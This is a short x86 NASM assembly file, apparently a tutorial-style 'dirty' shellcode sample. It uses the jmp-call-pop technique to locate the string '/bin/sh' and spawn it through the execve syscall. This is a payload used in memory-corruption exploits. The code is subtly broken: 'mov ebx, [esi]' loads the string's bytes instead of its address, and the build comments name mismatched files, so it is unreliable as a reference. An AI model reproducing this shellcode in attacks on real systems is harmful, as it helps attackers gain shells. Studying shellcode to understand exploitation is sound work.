; nasm -f elf32 dirty-low-level-shellcode.asm
; ld -m elf_i386 dirty-low-levelshellcode.o -o dirty-low-levelshellcode

; jump to take_bin_sh function
jmp short take_bin_sh

shellcode:
; so, here we can use pop to get our defined string
  pop esi
; move in eax zero to add to the end of the string to make it null-terminated
  mov eax, 0
  mov byte [esi + 7], al
; ebx needs to store the address of the string with a new program to execute
  mov ebx, [esi]
; ecx, edx just sets to zero
  mov ecx, eax
  mov edx, eax
; move to eax the number of the syscall
  mov eax, 0xb
; do interruption
  int 0x80

take_bin_sh:
; when the call instruction is executed
; it places the next instruction onto the stack as the return address
  call shellcode
  db "/bin/sh"
